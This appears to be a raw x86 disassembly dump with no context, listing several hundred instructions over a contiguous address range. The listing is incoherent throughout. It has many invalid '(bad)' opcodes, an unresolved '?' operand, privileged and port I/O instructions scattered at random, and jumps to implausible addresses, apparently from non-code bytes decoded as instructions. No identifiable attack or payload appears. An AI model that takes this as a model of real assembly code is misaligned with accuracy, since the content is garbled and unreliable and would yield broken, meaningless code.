  4330de:	fs jmp 0x7ec876e3
  4330e4:	bswap  ecx
  4330e6:	scas   al,BYTE PTR es:[edi]
  4330e7:	inc    esp
  4330e8:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  4330ef:	or     BYTE PTR [ebx-0x97717c6],0x83
  4330f6:	call   DWORD PTR [edi]
  4330f8:	shr    ah,0x84
  4330fb:	xchg   DWORD PTR [eax],eax
  4330fd:	add    DWORD PTR [eax],eax
  4330ff:	add    bh,bh
  433101:	dec    ebp
  433102:	and    BYTE PTR [ecx-0x38],dl
  433105:	push   eax
  433106:	dec    DWORD PTR [ebx+0xfd885]
  43310c:	mov    BYTE PTR [ebp+0x508bac00],cl
  433112:	mov    WORD PTR [ecx+0x0],ss
  433115:	lea    ecx,[ebx+0x108b20d8]
  43311b:	mov    WORD PTR [edx],ds
  43311d:	add    BYTE PTR [edi+0xff01ff],al
  433123:	mov    ecx,DWORD PTR [ebp-0x28]
  433126:	push   ecx
  433127:	shl    BYTE PTR [ebp+0x3a],0x8b
  43312b:	inc    ebp
  43312c:	in     al,0xeb
  43312e:	jno    0x4330bb
  433130:	push   edx
  433131:	mov    DWORD PTR [eax-0x28],edx
  433134:	mov    eax,DWORD PTR [ebp+0x20]
  433137:	je     0x4330c0
  433139:	mov    eax,DWORD PTR [ecx]
  43313b:	sbb    BYTE PTR [eax],al
  43313d:	pop    DWORD PTR [eax]
  43313f:	add    esi,eax
  433141:	add    bl,al
  433143:	adc    DWORD PTR [edi],esi
  433145:	jmp    0x8bce8197
  43314a:	sub    BYTE PTR [ebp+eax*2-0x63c4ca00],cl
  433151:	jne    0x4330de
  433153:	mov    ecx,DWORD PTR [eax]
  433155:	in     al,0x75
  433157:	pop    DWORD PTR [ecx+0x5101]
  43315d:	push   edx
  43315e:	inc    DWORD PTR [ebx]
  433160:	adc    BYTE PTR [ecx+0x45721cc6],cl
  433166:	add    BYTE PTR [edi+0x9],dl
  433169:	call   DWORD PTR [esi]
  43316b:	and    dl,al
  43316d:	and    bh,bh
  43316f:	inc    edi
  433171:	test   eax,edx
  433173:	sldt   ebx
  433176:	cmp    DWORD PTR [eax],eax
  433178:	pushf  
  433179:	(bad)  
  43317a:	jmp    0x433188
  43317c:	mov    eax,edi
  43317e:	or     al,0x75
  433180:	inc    eax
  433181:	call   0x432889
  433186:	mov    eax,eax
  433188:	loopne 0x43310e
  43318a:	inc    ebp
  43318b:	add    BYTE PTR [ebx+0x1451c00],cl
  433191:	mov    eax,DWORD PTR [ebp+0x20]
  433194:	add    edi,ecx
  433196:	add    BYTE PTR [eax],ch
  433198:	cmp    edi,0x18
  43319b:	test   DWORD PTR [ebp+0xf],esi
  43319e:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  4331a5:	jne    0x4331a9
  4331a7:	call   0xffa22c6c
  4331ac:	leave  
  4331ad:	rcr    BYTE PTR [esp+eax*4],0x55
  4331b1:	add    ah,ch
  4331b3:	add    BYTE PTR [edi-0x48fef979],dh
  4331b9:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  4331c0:	inc    esp
  4331c1:	mov    ebx,DWORD PTR [eax]
  4331c3:	fcom   st(2)
  4331c5:	add    BYTE PTR [edi],bl
  4331c7:	lea    ecx,[eax-0x18]
  4331ca:	(bad)  
  4331cb:	push   DWORD PTR [ecx]
  4331cd:	call   0xffb57f2f
  4331d2:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  4331d6:	fstp   DWORD PTR [esi+ebx*8]
  4331d9:	push   ebp
  4331da:	pop    ebp
  4331db:	mov    esi,DWORD PTR [edx-0x38]
  4331de:	add    DWORD PTR [eax],0x28
  4331e1:	mov    edi,DWORD PTR [ebx]
  4331e3:	xor    esi,DWORD PTR [edx+0x3]
  4331e6:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  4331ea:	pop    ebp
  4331eb:	or     al,0x4
  4331ed:	inc    ecx
  4331ee:	push   ebp
  4331ef:	(bad)  
  4331f0:	in     al,dx
  4331f1:	or     ah,ch
  4331f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4331f4:	xbegin 0xffc8a7ea
  4331fa:	clc    
  4331fb:	adc    al,0x45
  4331fd:	idiv   BYTE PTR [ecx]
  4331ff:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  433206:	test   DWORD PTR [ecx+0x665b00f8],ebx
  43320c:	add    BYTE PTR [ecx+0x66],dh
  43320f:	add    eax,DWORD PTR [ebp+0x52]
  433212:	adc    eax,0x20
  433215:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  43321b:	test   DWORD PTR [eax],eax
  43321d:	clc    
  43321e:	data16 or al,BYTE PTR [ebp+0x45]
  433222:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  433229:	rol    BYTE PTR [ebp+0x45],1
  43322c:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  433232:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  433238:	push   ebx
  433239:	add    BYTE PTR [ecx+0x0],dl
  43323c:	push   ecx
  43323d:	jge    0x433272
  43323f:	add    BYTE PTR [esi+0x4],dl
  433242:	jne    0x4332a9
  433244:	mov    edx,0x457200
  433249:	jmp    0x43320d
  43324b:	xor    edi,DWORD PTR [ebx]
  43324d:	pop    edi
  43324e:	cvtdq2ps xmm7,xmm0
  433251:	ret    0x0
  433254:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  43325a:	xor    ecx,DWORD PTR [edi]
  43325c:	add    eax,DWORD PTR [ecx+0x3b]
  43325f:	push   ebx
  433260:	rdpmc  
  433262:	out    0x8d,al
  433264:	add    BYTE PTR [eax],cl
  433266:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  43326c:	ret    0x450c
  43326f:	sbb    al,0x8b
  433271:	cmp    eax,esi
  433273:	or     cl,al
  433275:	or     al,0xc2
  433277:	pop    eax
  433278:	inc    ebp
  433279:	add    ecx,DWORD PTR [edi]
  43327b:	add    esi,DWORD PTR [ebp+0x39]
  43327e:	invd   
  433280:	jge    0x43328c
  433282:	mov    eax,0x478ac0
  433287:	cli    
  433288:	xor    esp,ecx
  43328a:	mov    ebx,0x5b8ac0
  43328f:	ret    0x33
  433292:	mov    eax,0x833a8b
  433297:	sub    BYTE PTR [ebx],al
  433299:	inc    ebp
  43329a:	data16 ss clc 
  43329d:	pushf  
  43329e:	inc    bh
  4332a0:	mov    esp,esp
  4332a2:	hlt    
  4332a3:	test   DWORD PTR [ebp-0x8],esi
  4332a6:	mov    eax,DWORD PTR [ebp-0x14]
  4332a9:	cmp    BYTE PTR [ebx-0x76478864],cl
  4332af:	dec    edi
  4332b0:	or     BYTE PTR [eax],al
  4332b2:	jne    0x43323d
  4332b4:	mov    esi,esp
  4332b6:	call   0x77a9be7b
  4332bb:	inc    ebp
  4332bc:	mov    DWORD PTR [eax+0x994f0c],edi
  4332c2:	add    BYTE PTR [ecx-0x3ffe0717],cl
  4332c8:	add    BYTE PTR [esi+0x7d],ah
  4332cb:	inc    ebp
  4332cc:	mov    bx,WORD PTR [ebp+0x8]
  4332d0:	add    DWORD PTR [ebp+0x51],0x30c008b
  4332d7:	inc    ebp
  4332d8:	mov    bx,di
  4332db:	lock test BYTE PTR [ecx+0x7000801],bh
  4332e2:	jge    0x4332a5
  4332e4:	mov    ecx,DWORD PTR [ebx-0x660613f0]
  4332ea:	cli    
  4332eb:	xor    bl,bh
  4332ed:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  4332f3:	test   BYTE PTR [eax],cl
  4332f5:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  4332fc:	cmp    ebp,eax
  4332fe:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  433305:	test   BYTE PTR [ebp+0x1],bh
  433308:	mov    ebx,0x458a00
  43330d:	xor    esi,DWORD PTR [ebx]
  43330f:	add    esp,DWORD PTR [esi-0x77]
  433312:	pop    ebp
  433313:	loopne 0x43337b
  433315:	inc    ebp
  433316:	clc    
  433317:	xor    edi,DWORD PTR [ebx]
  433319:	add    esi,DWORD PTR [edx-0x77]
  43331c:	data16 fdivr QWORD PTR [ebp-0x49]
  433320:	mov    ebx,0xb78afc
  433325:	hlt    
  433326:	xor    edi,DWORD PTR [eax]
  433328:	data16 add BYTE PTR [ebp+0x66],bl
  43332c:	data16 lock clc 
  43332f:	cmp    BYTE PTR [ebx],bh
  433331:	add    BYTE PTR [edi+0x66],dh
  433334:	psubq  mm7,QWORD PTR [ebp-0x2]
  433338:	ltr    WORD PTR [ebp+0x66]
  43333c:	add    esi,eax
  43333e:	add    di,WORD PTR [ebp+0x2b]
  433342:	data16 data16 jge 0x4333c3
  433346:	mov    ebx,0xe08a8b
  43334b:	jge    0x433380
  43334d:	data16 data16 xor al,0x5d
  433351:	data16 data16 jne 0x43334d
  433355:	mov    edi,DWORD PTR [ebx]
  433357:	fdiv   QWORD PTR [edx+0x7d]
  43335a:	data16 data16 jge 0x433392
  43335e:	mov    ebx,0x758a66
  433363:	mov    esi,0x667233
  433368:	pop    ebp
  433369:	or     BYTE PTR [esi+0x0],ah
  43336c:	clc    
  43336d:	mov    edi,DWORD PTR [ebx]
  43336f:	lock ja 0x4332fd
  433372:	(bad)  
  433374:	jge    0x43336d
  433376:	invd   
  433378:	pop    ebp
  433379:	add    BYTE PTR [ebx],al
  43337b:	(bad)  
  43337c:	cmp    di,WORD PTR [ebp+0xf]
  433380:	data16 sbb bh,BYTE PTR [ebp+0x0]
  433384:	mov    bx,WORD PTR [ebp-0x10]
  433388:	pop    bp
  43338a:	fbstp  TBYTE PTR [ebx]
  43338c:	test   DWORD PTR [ebx],eax
  43338e:	add    BYTE PTR [ebx],bh
  433390:	add    BYTE PTR [esi+0x7d],ah
  433393:	jge    0x433320
  433395:	data16 in al,dx
  433397:	pop    ebp
  433398:	stc    
  433399:	bsf    ecx,DWORD PTR [ebp+0x66320099]
  4333a0:	mov    edi,ebx
  4333a2:	in     al,dx
  4333a3:	test   BYTE PTR [ebp+0x0],bh
  4333a6:	mov    eax,DWORD PTR [eax]
  4333a8:	call   0xbd402d38
  4333ad:	cmp    BYTE PTR [ecx-0x7699ce00],bl
  4333b3:	sti    
  4333b4:	call   0x8b4bb144
  4333b9:	add    ebp,esp
  4333bb:	mov    bx,di
  4333be:	jnp    0x4333e6
  4333c0:	mov    DWORD PTR [ebx+0x387df808],ecx
  4333c6:	mov    eax,DWORD PTR [eax]
  4333c8:	call   0x7c3ebf33
  4333cd:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  4333d3:	data16 data16 fistp WORD PTR [ebp+0xe]
  4333d8:	xor    DWORD PTR [edi-0x48fff7af],0xfb66f403
  4333e2:	fisttp WORD PTR [ecx-0x7401f77b]
  4333e8:	(bad)  
  4333e9:	cld    
  4333ea:	jne    0x433424
  4333ec:	xor    eax,DWORD PTR [eax]
  4333ee:	mov    esp,DWORD PTR [esi-0x10]
  4333f1:	sti    
  4333f2:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  4333f9:	data16 adc bl,bh
  4333fc:	push   ebp
  4333fd:	xor    ecx,DWORD PTR es:[ebx+0x38e4f88b]
  433404:	mov    WORD PTR [eax],es
  433406:	cdq    
  433407:	data16 xor bh,bl
  43340a:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  433410:	mov    esp,DWORD PTR [esi-0x14]
  433413:	fisttp WORD PTR [ebx-0x3748a9f2]
  433419:	or     al,0x2b
  43341b:	mov    bh,0xba
  43341d:	hlt    
  43341e:	mov    bh,bl
  433420:	add    BYTE PTR [ecx-0x7446f3cd],cl
  433426:	dec    edi
  433427:	or     al,0x0
  433429:	mov    edi,DWORD PTR [ebx]
  43342b:	or     BYTE PTR [ebp+0x3b],dh
  43342e:	mov    ecx,DWORD PTR [edi]
  433430:	fdivr  QWORD PTR [ebx-0x7499ff83]
  433436:	xor    al,0xd8
  433438:	pop    bp
  43343a:	lock xor esi,DWORD PTR [ebx]
  43343d:	lea    esp,[esi+0x1f]
  433440:	icebp  
  433441:	jb     0x433447
  433443:	add    al,al
  433445:	jge    0x433453
  433447:	mov    eax,eax
  433449:	fsubr  st,st(3)
  43344b:	pop    ebp
  43344c:	mov    esi,DWORD PTR [ebx]
  43344e:	in     al,0x8d
  433450:	rcr    DWORD PTR [edi],0xc2
  433453:	jb     0x4334b3
  433455:	add    cl,cl
  433457:	jge    0x433465
  433459:	mov    edx,DWORD PTR [ebp-0x20]
  43345c:	in     al,dx
  43345d:	pop    ebp
  43345e:	data16 data16 or BYTE PTR [esi+edi*4],bh
  433463:	data16 cmp bh,BYTE PTR [ebp+0x0]
  433467:	mov    ebp,DWORD PTR [ebx]
  433469:	fdivr  QWORD PTR [esi+0x668a5d]
  43346f:	cmp    al,0x33
  433471:	mov    si,0x4f7d
  433475:	mov    eax,DWORD PTR [eax]
  433477:	lock inc ebp
  433479:	mov    esi,DWORD PTR [edi]
  43347b:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  433482:	clc    
  433483:	(bad)  
  433484:	cmp    edi,DWORD PTR [ebx]
  433486:	je     0x433497
  433488:	push   ebx
  433489:	loopne 0x43349a
  43348b:	dec    ecx
  43348d:	mov    esp,DWORD PTR [edi-0x1c]
  433490:	int    0xf1
  433492:	mov    esi,0x703084d
  433497:	pcmpgtd mm6,mm1
  43349a:	add    BYTE PTR [ebp+0x66],dh
  43349d:	jmp    0x43346a
  43349f:	mov    eax,DWORD PTR [ebx]
  4334a1:	lock push ebp
  4334a3:	ror    DWORD PTR [ebp-0x2972feb3],1
  4334a9:	or     bh,dl
  4334ab:	jb     0x4334ab
  4334ad:	add    BYTE PTR [ebx-0x1a7487b3],cl
  4334b3:	loopne 0x4334b5
  4334b5:	jne    0x4334b5
  4334b7:	data16 add BYTE PTR [esi+eiz*2],dh
  4334bb:	mov    ecx,ebx
  4334bd:	data16 cmp cl,dh
  4334c0:	add    BYTE PTR [eax],bh
  4334c2:	data16 add bl,cl
  4334c5:	data16 cmp dh,dl
  4334c8:	add    BYTE PTR [edx],bh
  4334ca:	data16 add bl,cl
  4334cd:	enterw 0x4df1,0x19
  4334d2:	pop    edi
  4334d3:	jne    0x433456
  4334d5:	mov    esi,DWORD PTR [edi]
  4334d7:	call   0x77b7c078
  4334dc:	xor    ebp,DWORD PTR [ebx]
  4334de:	lea    esp,[esi+0x48]
  4334e1:	repnz in eax,0x3b
  4334e4:	add    BYTE PTR [ebp-0x37],dh
  4334e7:	xor    edx,DWORD PTR [ebp-0x15]
  4334ea:	in     al,dx
  4334eb:	xor    edx,DWORD PTR [esi+0x40]
  4334ee:	mov    DWORD PTR [edi],0x338545fc
  4334f4:	clc    
  4334f5:	add    esi,DWORD PTR [esi]
  4334f7:	pop    edi
  4334f8:	pushf  
  4334f9:	pop    ebx
  4334fa:	call   0xff4434c1
  4334ff:	mov    edi,eax
  433501:	push   ecx
  433502:	pop    es
  433503:	mov    edi,DWORD PTR [edx]
  433505:	push   esi
  433506:	inc    esp
  433507:	(bad)  
  433508:	jle    0x43350a
  43350a:	popa   
  43350b:	data16 (bad) 
  43350d:	into   
  43350e:	addr16 cmp ch,cl
  433511:	add    BYTE PTR [ecx+0x7ce0866],bh
  433517:	cmp    ah,BYTE PTR [esi+0x0]
  43351a:	add    bh,al
  43351c:	(bad)  
  43351d:	cld    
  43351e:	add    BYTE PTR [ebp+0x36c3f866],al
  433524:	cmp    BYTE PTR [eax+eax*1-0x3c31999a],bl
  43352b:	pop    ebp
  43352c:	or     BYTE PTR [edi+0x0],dl
  43352f:	mov    bh,0x66
  433531:	mov    edi,0xff038dc3
  433536:	jne    0x433589
  433538:	lea    edx,[ecx+0x1]
  43353b:	mov    ebx,0xd64ff1
  433540:	sar    DWORD PTR [ebx],1
  433542:	test   BYTE PTR [ebp+0x32],dh
  433545:	mov    DWORD PTR [esp+edi*8-0x76],esp
  433549:	push   edi
  43354a:	xor    BYTE PTR [ebx],0x3a
  43354d:	mov    esi,ebx
  43354f:	xor    eax,DWORD PTR [eax-0x3c73819a]
  433555:	xor    al,BYTE PTR [ebp+0x64]
  433558:	pop    ebx
  433559:	mov    ebx,0x9c3a37
  43355e:	je     0x43358b
  433560:	xor    edi,DWORD PTR [ebx+0x668a33]
  433566:	mov    WORD PTR [ebx],?
  433568:	xor    bh,BYTE PTR [ebx+0x8b4f64]
  43356e:	pop    edi
  43356f:	cmp    ecx,ecx
  433571:	jne    0x4335c8
  433573:	mov    ebp,esp
  433575:	cld    
  433576:	push   esi
  433577:	pop    ebx
  433578:	inc    ebp
  433579:	stc    
  43357a:	aaa    
  43357b:	test   DWORD PTR [eax+edi*8-0x317af642],ebx
  433582:	clc    
  433583:	test   dl,dl
  433585:	xor    al,0xff
  433587:	fs pop si
  43358a:	or     bl,al
  43358c:	dec    BYTE PTR [ebx+0x57665100]
  433592:	retf   0x3845
  433595:	aaa    
  433596:	add    BYTE PTR [esi+eiz*2+0x3a85cabe],bl
  43359d:	clc    
  43359e:	add    BYTE PTR [ebx+0x66],bl
  4335a1:	dec    edx
  4335a3:	mov    edx,DWORD PTR [edi-0x76]
  4335a6:	push   edi
  4335a7:	add    al,0xb7
  4335a9:	xor    al,0xba
  4335ab:	cmp    al,0x8d
  4335ad:	je     0x4335ae
  4335af:	mov    edx,DWORD PTR [ecx-0x46]
  4335b2:	push   ecx
  4335b3:	lea    edi,[ebx+0x514fff]
  4335b9:	push   ecx
  4335ba:	cmp    edx,DWORD PTR [ebx+0x75]
  4335bd:	mov    ecx,DWORD PTR [ecx+0x723afcbb]
  4335c3:	add    BYTE PTR [ebx],dh
  4335c5:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  4335cb:	add    BYTE PTR [ebx+esi*1+0x4f64bb32],cl
  4335d2:	mov    ebx,0x3b3a00
  4335d7:	jne    0x433604
  4335d9:	mov    DWORD PTR [ebx+0x728afc],edi
  4335df:	xor    esi,DWORD PTR [ebx]
  4335e1:	mov    edi,DWORD PTR [ebx+0x8d4f33]
  4335e7:	push   edi
  4335e8:	cmp    esp,ebp
  4335ea:	jne    0x4335ec
  4335ec:	sbb    DWORD PTR [eax],0x8085c3fc
  4335f2:	clc    
  4335f3:	inc    esp
  4335f4:	pop    ebx
  4335f5:	sti    
  4335f6:	add    eax,0xeb8bc075
  4335fb:	cld    
  4335fc:	xor    edi,DWORD PTR ds:0xf8c3855e
  433602:	mov    ecx,DWORD PTR [ecx+edx*2]
  433605:	rol    DWORD PTR [ebp-0x37],0xf
  433609:	mov    DWORD PTR [eax],ecx
  43360b:	inc    edi
  43360c:	(bad)  
  43360d:	in     eax,0x2
  43360f:	add    bh,bh
  433611:	(bad)  
  433612:	mov    esi,0xc38a5e
  433617:	mov    esi,DWORD PTR [ebx]
  433619:	push   ecx
  43361a:	mov    edi,0xfc4fc7
  43361f:	test   DWORD PTR [ebp-0x8],edx
  433622:	data16 ss (bad) 
  433625:	pushf  
  433626:	sub    ebp,eax
  433628:	inc    ebp
  433629:	(bad)  
  43362a:	sub    edi,edi
  43362c:	mov    DWORD PTR [ebx+0x3a03ba08],ecx
  433632:	inc    ebp
  433633:	add    BYTE PTR [esi+0x2b],ah
  433636:	or     bh,BYTE PTR [edx+0xf8ac2]
  43363c:	cmp    al,0x33
  43363e:	mov    edi,DWORD PTR [edx+0x24f81]
  433644:	(bad)  
  433645:	cmp    esi,DWORD PTR [ebx]
  433647:	je     0x433601
  433649:	push   ebx
  43364a:	dec    edi
  43364b:	str    ecx
  43364e:	cmp    esp,DWORD PTR [edi+0x75]
  433651:	int    0x33
  433653:	mov    edi,0x789085f
  433658:	mov    ecx,DWORD PTR [eax]
  43365a:	cld    
  43365b:	add    cl,cl
  43365d:	data16 add al,0xcb
  433660:	push   ebp
  433661:	add    ebp,esp
  433663:	jne    0x433651
  433665:	(bad)  
  433666:	mov    DWORD PTR [ecx],0xd685f7ec
  43366c:	clc    
  43366d:	xlat   BYTE PTR ds:[ebx]
  43366e:	inc    ebp
  43366f:	mov    edi,DWORD PTR [ecx]
  433671:	push   eax
  433672:	pushf  
  433673:	in     eax,0x8b
  433675:	add    ah,ch
  433677:	(bad)  
  433678:	push   ecx
  433679:	add    BYTE PTR [ecx+0x66],dl
  43367c:	add    eax,0x3872cb
  433681:	add    BYTE PTR [ebp+0x66],al
  433684:	(bad)  
  433685:	retf   
  433686:	lock cmp al,BYTE PTR [ebp+0x4566f800]
  43368d:	retf   
  43368e:	cmp    cl,al
  433690:	pushf  
  433691:	jge    0x43365a
  433693:	aaa    
  433694:	cld    
  433695:	pushf  
  433696:	test   DWORD PTR [edi-0x8],ebx
  433699:	je     0x4336e0
  43369b:	xor    esi,DWORD PTR ds:0x7020840
  4336a1:	ror    BYTE PTR [ebp-0x37],0x8d
  4336a5:	push   ebp
  4336a6:	add    esp,ebp
  4336a8:	jb     0x433635
  4336aa:	add    BYTE PTR [eax],cl
  4336ac:	dec    ebp
  4336ad:	mov    bh,0x81
  4336af:	push   esi
  4336b0:	push   ecx
  4336b1:	adc    DWORD PTR [ecx-0x3b],0x3899ff81
  4336b8:	xor    al,BYTE PTR [eax]
  4336ba:	mov    edx,DWORD PTR [edi+0x10]
  4336bd:	(bad)  
  4336be:	scas   eax,DWORD PTR es:[edi]
  4336bf:	cmp    bh,BYTE PTR [ebx]
  4336c1:	add    BYTE PTR [edi],cl
  4336c3:	mov    ebp,ebp
  4336c5:	cld    
  4336c6:	add    BYTE PTR [ebx],bh
  4336c8:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  4336cc:	dec    ebp
  4336cd:	or     BYTE PTR [ebx],ch
  4336cf:	ret    0x458b
  4336d2:	lock jmp 0x4336c6
  4336d5:	mov    ecx,DWORD PTR [eax]
  4336d7:	or     BYTE PTR [edi],al
  4336d9:	mov    ecx,eax
  4336db:	xor    DWORD PTR [edx+0x2],0x0
  4336df:	mov    bh,0xc1
  4336e1:	adc    BYTE PTR [eax],dh
  4336e3:	iret   
  4336e4:	inc    ebp
  4336e5:	mov    DWORD PTR [ebx],0x4dfff8c5
  4336eb:	inc    BYTE PTR [ebx]
  4336ed:	cmp    bh,al
  4336ef:	add    BYTE PTR [ecx],dl
  4336f1:	data16 adc al,bh
  4336f4:	dec    ecx
  4336f5:	fisttp WORD PTR [ecx+0x456604c0]
  4336fb:	add    dh,BYTE PTR ds:0x75e0845
  433701:	ret    0x4d
  433704:	lea    ecx,[ebx+0x18728301]
  43370a:	add    BYTE PTR [ebp+0x45],al
  43370d:	ss jmp 0x10a37af
  433713:	call   0xf8cebc5d
  433718:	clc    
  433719:	inc    ebp
  43371a:	shl    DWORD PTR ds:0x781084d,0x51
  433721:	cdq    
  433722:	push   ecx
  433723:	xor    al,BYTE PTR [ecx+0x32f89989]
  433729:	inc    ebp
  43372a:	cmp    edi,DWORD PTR [esi]
  43372c:	jbe    0x4336ca
  43372e:	mov    eax,edi
  433730:	or     ah,dh
  433732:	inc    ebp
  433733:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  433739:	cmp    BYTE PTR [ebx-0x74747664],cl
  43373f:	in     al,dx
  433740:	hlt    
  433741:	push   ecx
  433742:	push   ecx
  433743:	push   ecx
  433744:	push   ecx
  433745:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  43374b:	cdq    
  43374c:	cdq    
  43374d:	xor    dh,BYTE PTR [edx]
  43374f:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  433755:	or     BYTE PTR [ebp+0x7],al
  433758:	mov    eax,ecx
  43375a:	clc    
  43375b:	jb     0x43371e
  43375d:	add    BYTE PTR [ebp+0x55],cl
  433760:	or     DWORD PTR [edi],0xc251d151
  433766:	add    DWORD PTR [ebx+0x320099],0x8b76453b
  433770:	mov    edi,eax
  433772:	or     cl,al
  433774:	inc    ebp
  433775:	dec    ebp
  433776:	mov    eax,DWORD PTR [ecx+0x514d510c]
  43377c:	or     WORD PTR [ecx],0x8999
  433781:	xor    cl,BYTE PTR [ebx+0x5176fc3b]
  433787:	mov    edx,DWORD PTR [ecx+0x8]
  43378a:	mov    eax,DWORD PTR [ebp-0x8]
  43378d:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb267]
  433794:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  43379a:	inc    ebp
  43379b:	dec    eax
  43379c:	add    ecx,DWORD PTR [ebx+0x514df0f8]
  4337a2:	add    edx,DWORD PTR [ecx-0x8]
  4337a5:	mov    ecx,DWORD PTR [ecx]
  4337a7:	clc    
  4337a8:	or     BYTE PTR [ebp+eax*2+0x45324099],al
  4337af:	mov    ecx,ebp
  4337b1:	clc    
  4337b2:	(bad)  
  4337b3:	popf   
  4337b4:	inc    DWORD PTR [eax]
  4337b6:	ret    0x8b
  4337b9:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  4337bf:	mov    edi,esp
  4337c1:	hlt    
  4337c2:	test   ecx,esi
  4337c4:	clc    
  4337c5:	or     BYTE PTR [ebp+0x7],al
  4337c8:	cmp    ecx,eax
  4337ca:	pushf  
  4337cb:	jb     0x433800
  4337cd:	add    BYTE PTR [eax-0x3f],al
  4337d0:	inc    eax
  4337d1:	daa    
  4337d2:	inc    ebp
  4337d3:	inc    ebp
  4337d4:	xor    eax,0x7f80803
  4337d9:	dec    ebp
  4337da:	cdq    
  4337db:	add    esi,DWORD PTR [edx]
  4337dd:	clc    
  4337de:	cmp    DWORD PTR [ecx],ecx
  4337e0:	or     al,0x8
  4337e2:	add    al,BYTE PTR [ebp+0x2c]
  4337e5:	xor    eax,0x7350845
  4337ea:	or     BYTE PTR [ebp+0x7],cl
  4337ed:	lea    ebx,[ecx-0x748dcdff]
  4337f3:	add    BYTE PTR [eax*2-0x74b21438],cl
  4337fa:	mov    edx,DWORD PTR [eax]
  4337fc:	cld    
  4337fd:	dec    ebp
  4337fe:	push   ecx
  4337ff:	sub    edx,DWORD PTR [ecx-0x75]
  433802:	add    eax,0xf172fc
  433807:	or     BYTE PTR [ebp+0x7],cl
  43380a:	add    eax,ecx
  43380c:	or     al,0x72
  43380e:	add    DWORD PTR [eax],eax
  433810:	mov    ebx,0x29c2c1
  433815:	inc    ebp
  433816:	mov    eax,DWORD PTR [ebx]
  433818:	cmp    eax,0x3004d1c
  43381e:	xbegin 0x66c8c418
  433824:	clc    
  433825:	or     BYTE PTR [ebp+0x45],al
  433828:	cmp    DWORD PTR ds:0x78b089c,esi
  43382e:	adc    BYTE PTR [ebp+0x45],cl
  433831:	lea    eax,[ebp+0x33727501]
  433837:	add    cl,ch
  433839:	inc    ebp
  43383a:	add    bl,ch
  43383c:	add    BYTE PTR [ebx+0x45850845],cl
  433842:	je     0x4337cf
  433844:	push   ebx
  433845:	or     al,0x85
  433847:	dec    ebp
  433848:	std    
  433849:	mov    bh,bh
  43384b:	mov    BYTE PTR [ebp-0x75],al
  43384e:	mov    edi,eax
  433850:	or     al,0x89
  433852:	inc    ebp
  433853:	clc    
  433854:	mov    esp,esp
  433856:	hlt    
  433857:	call   DWORD PTR [edi-0x37]
  43385a:	push   ecx
  43385b:	or     al,0x51
  43385d:	push   ebp
  43385e:	xor    ebp,esp
  433860:	mov    esi,0x457251
  433865:	ss (bad) 
  433867:	pushf  
  433868:	inc    ebp
  433869:	(bad)  
  43386a:	mov    edi,eax
  43386c:	or     al,0x85
  43386e:	add    al,bh
  433870:	inc    eax
  433872:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  433876:	or     ah,bh
  433878:	inc    eax
  433879:	push   ecx
  43387a:	jmp    0x4338cd
  43387c:	mov    eax,DWORD PTR ds:0xe8720c
  433882:	mov    DWORD PTR [ebp-0x8],eax
  433885:	jne    0x4338cc
  433887:	jmp    0x433814
  433889:	mov    ebp,DWORD PTR [eax]
  43388b:	clc    
  43388c:	retf   0xff51
  43388f:	push   ecx
  433890:	mov    DWORD PTR ds:0x757210,eax
  433896:	mov    ecx,DWORD PTR [ebp-0x4]
  433899:	sub    esp,DWORD PTR [ebx-0x77]
  43389c:	dec    DWORD PTR [eax*4-0x74ca8abb]
  4338a3:	or     ah,bh
  4338a5:	pop    es
  4338a6:	ds cdq 
  4338a8:	push   DWORD PTR [edx]
  4338aa:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  4338b0:	(bad)  
  4338b1:	mov    bh,bh
  4338b3:	jmp    0x4338a1
  4338b5:	leave  
  4338b6:	jne    0x4338c0
  4338b8:	call   0x303212
  4338bd:	in     al,dx
  4338be:	dec    ebp
  4338bf:	add    dh,BYTE PTR [ebx]
  4338c1:	add    BYTE PTR [ebx],al
  4338c3:	inc    ebp
  4338c4:	cmp    esi,DWORD PTR [esi]
  4338c6:	je     0x433864
  4338c8:	mov    eax,edi
  4338ca:	or     al,0xf0
  4338cc:	add    BYTE PTR [ebp+0x458bf845],al
  4338d2:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  4338d8:	adc    al,0x7
  4338da:	enter  0x9fc0,0xa5
  4338de:	rol    BYTE PTR [eax],0x5e
  4338e1:	mov    ecx,ecx
  4338e3:	or     al,0xc
  4338e5:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  4338ec:	jmp    0x4338ed
  4338ee:	push   ebp
  4338ef:	mov    esp,ebp
  4338f1:	cld    
  4338f2:	inc    ebp
  4338f3:	inc    ebp
  4338f4:	or     DWORD PTR [ecx+0x457dec10],0x0
  4338fb:	push   esi
  4338fc:	push   esi
  4338fd:	mov    edi,0x7af080f
  433902:	add    bh,al
  433904:	test   DWORD PTR [ecx+0x3a7320f],ebx
  43390a:	add    BYTE PTR [ecx+0x4540100f],cl
  433910:	mov    ebp,eax
  433912:	mov    ebp,edi
  433914:	lock call edx
  433917:	fcom   DWORD PTR [ebp+0x45]
